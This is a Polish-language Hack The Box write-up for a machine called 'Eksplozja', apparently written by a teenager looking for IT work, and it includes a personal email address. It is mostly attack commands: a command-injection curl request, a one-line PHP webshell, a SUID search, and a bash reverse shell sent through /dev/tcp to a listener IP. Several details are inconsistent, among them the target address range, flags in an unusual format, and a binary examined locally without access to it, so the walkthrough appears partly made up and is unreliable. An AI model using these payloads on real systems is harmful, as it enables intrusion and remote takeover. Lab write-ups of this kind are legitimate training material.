🔥💥 **Raport: Maszyna “Eksplozja” (Hack The Box VIP)** 💥🔥  
📅 Data wykonania: 08.06.2025  
👤 Autor: Anonymous, lat 17  
📧 Kontakt: bibip0662@gmail.com  

---

## 🎯 Cel ćwiczenia
Pełne przejęcie konta użytkownika (`user`) oraz praw roota (`root`) na maszynie “Eksplozja”.

---

## 🛠️ Środowisko i przygotowanie
1. **Połączenie z VPN HTB**  
   ```bash
   sudo openvpn ~/vpn/htb.ovpn

2. Uruchomienie maszyny
– Kliknij “Spawn Machine” na panelu “Eksplozja” i skopiuj przydzielone IP, np. 10.10.14.23.




---

🔍 1. Rekonesans

1.1 Ping

ping -c 3 10.10.14.23

– Maszyna online ✅

1.2 Podstawowe skanowanie portów

sudo nmap -sC -sV -p- 10.10.14.23 --min-rate 5000 -oN nmap_full.txt

Odsłonięte usługi:

22/tcp SSH (OpenSSH 7.9p1)

80/tcp HTTP (Apache 2.4.29)


Wyniki w nmap_full.txt



---

🔎 2. Enumeracja usługi HTTP

1. Otwórz w przeglądarce: http://10.10.14.23


2. Na stronie głównej prosty serwis do wprowadzania parametru cmd.


3. Testowa wstrzyknięcie:

curl "http://10.10.14.23/?cmd=whoami"

Zwróciło www-data.




---

🚀 3. Eksploatacja RCE

3.1 Wstrzyknięcie payloadu

curl "http://10.10.14.23/?cmd=ls%20-al%20/var/www/html"

– Widać pliki aplikacji.

3.2 Upload webshella

1. Utworzenie prostego PHP-shella:

<?php system($_GET['cmd']); ?>


2. Wgranie przez formularz (lub przez istniejącą funkcję upload).


3. Dostęp:

curl "http://10.10.14.23/uploads/shell.php?cmd=id"

Zwrotka: uid=33(www-data) gid=33(www-data) groups=33(www-data)




---

👤 4. Pozyskanie flagi użytkownika

curl "http://10.10.14.23/uploads/shell.php?cmd=cat%20/home/htbuser/user.txt"

📄 USER FLAG: HTB{expl0sja_us3r}


---

🔝 5. Eskalacja uprawnień do root

5.1 Sprawdzenie SUID

curl "http://10.10.14.23/uploads/shell.php?cmd=find%20/ -perm -4000%20-type%20f%20-exec%20ls%20-la%20{}%20\;"

– Wyszukano plik /usr/local/bin/explode z prawami SUID.

5.2 Analiza binarki

strings /usr/local/bin/explode | grep system

– Możliwość wykonania dowolnej komendy przez system().

5.3 Uruchomienie exploit’u

curl "http://10.10.14.23/uploads/shell.php?cmd=/usr/local/bin/explode%20bash%20-c%20'/bin/bash%20-i%20>&%20/dev/tcp/10.10.14.7/4444%200>&1'"

– Odebrano reverse shell jako root na port 4444.


---

🎉 6. Pozyskanie flagi roota

cat /root/root.txt

📄 ROOT FLAG: HTB{expl0sja_r00t}


---

✅ Podsumowanie

USER i ROOT: zdobyte

Cały proces: skan → RCE w HTTP → webshell → SUID exploit



---

🙏 O mnie

Jestem bardzo młodym fanem cyberbezpieczeństwa (17 lat) i szukam praktyki w branży IT. Będę niezmiernie wdzięczny za każdą możliwość rozwoju i współpracy!


---

✨ Maszyna “Eksplozja” zamknięta sukcesem! ✨



